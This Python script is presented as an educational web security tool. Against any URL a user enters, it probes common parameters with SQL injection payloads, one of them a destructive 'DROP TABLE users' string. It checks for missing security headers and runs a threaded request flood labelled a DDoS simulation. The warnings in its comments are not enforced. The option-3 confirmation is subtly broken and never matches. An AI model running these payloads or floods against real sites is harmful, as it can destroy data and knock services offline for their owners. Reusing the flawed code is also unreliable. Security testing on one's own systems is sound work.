import requests
import sys
import threading
import time
from urllib.parse import urlparse, urljoin

# CONFIGURATION
# ---------------------------------------------------------
# WARNING: ONLY RUN THIS ON WEBSITES YOU OWN OR HAVE PERMISSION TO TEST.
# Unauthorized testing is illegal.
# ---------------------------------------------------------

class WebSecurityTool:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.stop_flag = False

    def check_site_status(self):
        """Check if the site is reachable and get server info."""
        print(f"\n[+] Checking status of: {self.target_url}")
        try:
            response = self.session.get(self.target_url, timeout=5)
            print(f"[+] Site is ONLINE. Status Code: {response.status_code}")
            print(f"[+] Server Info: {response.headers.get('Server', 'Unknown/Hidden')}")
            print(f"[+] Powered By: {response.headers.get('X-Powered-By', 'Unknown')}")
            return True
        except requests.exceptions.RequestException as e:
            print(f"[-] Site is OFFLINE or unreachable: {e}")
            return False

    def scan_sql_injection(self):
        """Basic check for SQL Injection vulnerabilities on common parameters."""
        print("\n[+] Scanning for SQL Injection vulnerabilities...")
        payloads = ["'", "\"", " OR 1=1 -- ", " OR 1=1 # ", "'; DROP TABLE users -- "]
        vulnerable = False

        # This is a basic check. Real scanning requires complex logic.
        # We simulate by checking if the site returns errors for bad inputs on a test path.
        # Note: This is a demonstration. Real scanners use time-based or blind techniques.
        
        test_paths = ["/?id=", "/search?q=", "/page?file="]
        
        for path in test_paths:
            test_url = self.target_url + path
            for payload in payloads:
                try:
                    full_url = test_url + payload
                    r = self.session.get(full_url, timeout=3)
                    # Simple heuristic: Check for SQL error keywords in response
                    if "sql syntax" in r.text.lower() or "mysql_fetch" in r.text.lower() or "warning" in r.text.lower():
                        print(f"[!] POTENTIAL SQL Injection Vulnerability Found at: {full_url}")
                        vulnerable = True
                except:
                    pass
        
        if not vulnerable:
            print("[+] No obvious SQL Injection vulnerabilities detected with basic checks.")
        else:
            print("[!] WARNING: Potential vulnerabilities found. Manual verification required.")

    def check_security_headers(self):
        """Check for missing security headers."""
        print("\n[+] Checking Security Headers...")
        response = self.session.get(self.target_url, timeout=5)
        headers = response.headers
        missing = []

        security_headers = [
            "Content-Security-Policy",
            "X-Frame-Options",
            "X-Content-Type-Options",
            "Strict-Transport-Security",
            "X-XSS-Protection"
        ]

        for header in security_headers:
            if header not in headers:
                missing.append(header)
                print(f"[-] Missing Header: {header}")
            else:
                print(f"[+] Secure Header Present: {header}")

        if missing:
            print(f"\n[!] CRITICAL: {len(missing)} security headers are missing. This site may be vulnerable to Clickjacking, XSS, or other attacks.")
        else:
            print("\n[+] All critical security headers are present.")

    def ddos_simulation(self, duration=5, thread_count=10):
        """Simulate a DDoS attack (Stress Test). WARNING: Can crash the server."""
        print(f"\n[!] STARTING DDoS SIMULATION (Stress Test)...")
        print(f"[!] Target: {self.target_url}")
        print(f"[!] Duration: {duration} seconds")
        print(f"[!] Threads: {thread_count}")
        print("[!] WARNING: This sends a high volume of requests. Only use on targets you own.")
        time.sleep(3) # Give user time to read warning

        self.stop_flag = False
        start_time = time.time()
        request_count = 0
        lock = threading.Lock()

        def worker():
            nonlocal request_count
            while not self.stop_flag and (time.time() - start_time) < duration:
                try:
                    self.session.get(self.target_url, timeout=2)
                    with lock:
                        request_count += 1
                except:
                    pass # Ignore errors during stress test

        threads = []
        for _ in range(thread_count):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            threads.append(t)

        # Wait for duration
        while (time.time() - start_time) < duration:
            time.sleep(1)
            print(f"[...] Attack in progress. Requests sent so far: {request_count}")

        self.stop_flag = True
        print(f"\n[+] Simulation Complete. Total requests sent: {request_count}")

def main():
    print("""
    __________________________________________________
    |                                                  |
    |   WEB SECURITY ASSESSMENT TOOL (Educational)     |
    |   Created by sivvv0                        |
    |__________________________________________________|
    """)
    
    target = input("Enter Target URL (e.g., http://example.com): ").strip()
    
    if not target.startswith("http"):
        print("[-] Invalid URL. Must start with http:// or https://")
        return

    tool = WebSecurityTool(target)

    if not tool.check_site_status():
        return

    print("\nSelect an option:")
    print("1. Scan for SQL Injection (Basic)")
    print("2. Check Missing Security Headers")
    print("3. Run DDoS Simulation (Stress Test)")
    print("4. Run Full Assessment (1, 2, and 3)")
    
    choice = input("Enter choice (1-4): ").strip()

    if choice == '1':
        tool.scan_sql_injection()
    elif choice == '2':
        tool.check_security_headers()
    elif choice == '3':
        confirm = input("Are you sure you want to run a DDoS simulation? (yes/no): ").strip()
        if confirm.lower == 'yes':
            tool.ddos_simulation()
        else:
            print("Cancelled.")
    elif choice == '4':
        tool.scan_sql_injection()
        tool.check_security_headers()
        confirm = input("Proceed to DDoS Simulation? (yes/no): ").strip()
        if confirm.lower() == 'yes':
            tool.ddos_simulation()
    else:
        print("Invalid choice.")

if __name__ == "__main__":
    main()
